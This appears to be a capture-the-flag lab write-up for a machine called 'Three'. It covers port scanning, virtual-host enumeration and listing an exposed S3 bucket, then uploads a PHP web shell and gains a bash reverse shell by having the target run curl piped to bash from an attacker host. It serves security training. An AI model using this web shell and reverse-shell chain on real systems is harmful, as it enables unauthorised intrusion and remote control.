# Three
----
> 10.129.6.204
----
## Nmap Scans

```
nmap -p- 10.129.6.204 --min-rate 1000
Nmap scan report for 10.129.6.204
Host is up (0.042s latency).
Not shown: 65333 closed tcp ports (reset), 200 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

nmap -sS -sV -sC -O -T4 -p 22,80 10.129.6.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 20:06 EST
Nmap scan report for 10.129.6.204
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds

```

## Enumerate: VHOST Busting

### ffuf
-  Found nothing. Bummer.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://thetoppers.htb/ -H "Host: FUZZ.thetoppers.htb" -fc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://thetoppers.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.thetoppers.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 200
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 938 req/sec :: Duration: [0:03:00] :: Errors: 0 ::
```
### Gobuster
-  Found several right out of the chute.
-  Go-Buster: VHOST Mode
	- This mode should not be mistaken to be the same as the DNS mode. In the DNS mode the tool attempts to DNS resolve the subdomains and based on that we are given the result. In vhosts mode the tool is checking if the subdomain exists by visiting the formed url and verifying the IP address. The following shows the output from the help command
	- Also: If using Gobuster version 3.2.0 and above we also have to add the `--append-domain` flag to our command so that the enumeration takes into account the known vHost (`thetoppers.htb`) and appends it to the words found in the wordlist (e.g., `word.thetoppers.htb`).
		-  From the help file: Append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist.
		-  This will **_not_** work without `--append-domain`.

```
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Found: _domainkey.thetoppers.htb Status: 400 [Size: 306]
Found: mailing._domainkey.sunnynews.thetoppers.htb Status: 400 [Size: 306]
Found: mailing._domainkey.info.thetoppers.htb Status: 400 [Size: 306]
Found: hallam_dev.thetoppers.htb Status: 400 [Size: 306]
Found: hallam_ad.thetoppers.htb Status: 400 [Size: 306]
Found: wm_j_b__ruffin.thetoppers.htb Status: 400 [Size: 306]
Found: 2609_n_www.thetoppers.htb Status: 400 [Size: 306]
Found: 0907_n_hn.m.thetoppers.htb Status: 400 [Size: 306]
Found: 0507_n_hn.thetoppers.htb Status: 400 [Size: 306]
Found: faitspare_mbp.cit.thetoppers.htb Status: 400 [Size: 306]
Found: sb_0601388345bc450b.thetoppers.htb Status: 400 [Size: 306]
Found: sb_0601388345bc6cd8.thetoppers.htb Status: 400 [Size: 306]
Found: api_portal_dev.thetoppers.htb Status: 400 [Size: 306]
Found: api_web_dev.thetoppers.htb Status: 400 [Size: 306]
Found: api_webi_dev.thetoppers.htb Status: 400 [Size: 306]
Found: sklep_test.thetoppers.htb Status: 400 [Size: 306]
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## awscli 
- Go have a look at the S3 storage bucket and its objects...

```
aws --endpoint-url http://s3.thetoppers.htb s3 ls
# Result: I think this is the bucket... 
2024-02-27 19:57:03 thetoppers.htb

# run the ls in the bucket to see the objects: 
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
# Results: 
                           PRE images/
2024-02-27 19:57:03          0 .htaccess
2024-02-27 19:57:03      11952 index.php
```

- Results: We have the following in the S3 bucket...
	- An images subdir
	- A hidden htaccess file (indicating this is the root dir of the website)
	- An index.php file (which is the home page, again indicating this is the webroot)
- If you were so inclined, you could list out the contents of the /images/ directory: 

```
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb/images/
# Results: 
2024-02-27 19:57:03      90172 band.jpg
2024-02-27 19:57:03     282848 band2.jpg
2024-02-27 19:57:03    2208869 band3.jpg
2024-02-27 19:57:03      77206 final.jpg
2024-02-27 19:57:03      69170 mem1.jpg
2024-02-27 19:57:03      39270 mem2.jpg
2024-02-27 19:57:03      64347 mem3.jpg
```

## Upload a PHP One-Liner to Test Command Execution
- Remember: the index page is .php, so you know php is running on the site.
```
# Created gk.php with the following: 
<?php system($_GET["gkvar"]); ?>

# Uploaded with awscli: 
aws --endpoint-url http://s3.thetoppers.htb s3 cp gk.php s3://thetoppers.htb/
## Results:
upload: ./gk.php to s3://thetoppers.htb/gk.php                   

# Check the Upload: 
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb        
## Results: 
                           PRE images/
2024-02-27 19:57:03          0 .htaccess
2024-02-27 20:34:30         32 gk.php        <--- there it is; good to go
2024-02-27 19:57:03      11952 index.php
```

- In the browser: 

```
http://thetoppers.htb/gk.php?gkvar=uname%20-a
# Result: 
Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

http://thetoppers.htb/gk.php?gkvar=cat%20/etc/passwd
# Result: dumped the /etc/passwd file
```

- Conclusion: We can execute arbitrary commands on the target.

## Reverse Shell (PHP)

- Create a file containing a Bash one-liner for a reverse shell: `shell.sh`

```
#!/bin/bash
bash -i &> /dev/tcp/10.10.14.42/1234 0>&1
```

- Start a listener on the attack machine: 

```
nc -nvlp 1234
```

- Spin up a web server to host the `shell.sh` file: 

```
python3 -m http.server 8888
```

- Use your PHP one-liner to send a `curl` command to the target, and use curl to transfer the `shell.sh` file to the target, pipe it to `bash` so Bash will execute it: 
```
http://thetoppers.htb/gk.php?gkvar=curl%20http://10.10.14.42:8888/shell.sh%20|%20bash
```

- Result: You listener...

```
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.6.204] 52738
bash: cannot set terminal process group (1532): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ 

www-data@three:/var/www/html$ ls 
ls 
gk.php
gk2.php
images
index.php

www-data@three:/var/www/html$ cd ..
cd ..

www-data@three:/var/www$ ls
ls
flag.txt
html

www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

![Pasted image 20240224162434](https://github.com/GregKedrovsky/Hacking/assets/26492233/ace71d25-628a-4cd7-bb20-84b8653d8f2c)

[walkthrough_014_three.pdf](https://github.com/GregKedrovsky/Hacking/files/14625850/walkthrough_014_three.pdf)
